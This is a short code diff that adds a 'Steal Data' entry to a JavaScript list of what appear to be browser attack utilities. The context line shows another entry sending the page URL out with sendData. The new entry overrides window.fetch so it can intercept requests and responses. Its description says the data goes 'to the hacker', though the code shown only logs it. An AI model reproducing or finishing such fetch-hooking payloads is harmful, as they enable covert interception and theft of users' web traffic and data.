@@ -83,6 +83,22 @@ const utils = [
       await sendData(window.location.href);
     }
   },
+
+
+  {
+    name: "Steal Data",
+    description: "Intercepts network fetch requests and gets a copy of the data to the hacker",
+    func: () => {
+      const fetch = window.fetch;
+      console.log(document.fetch);
+      window.fetch = (...args) => (async(args) => {
+      console.log(...args);
+      var result = await fetch(...args);
+      console.log(result); // intercept response here
+      return result;
+      })(args);
+    }
+  }
 ]
 
 module.exports = utils
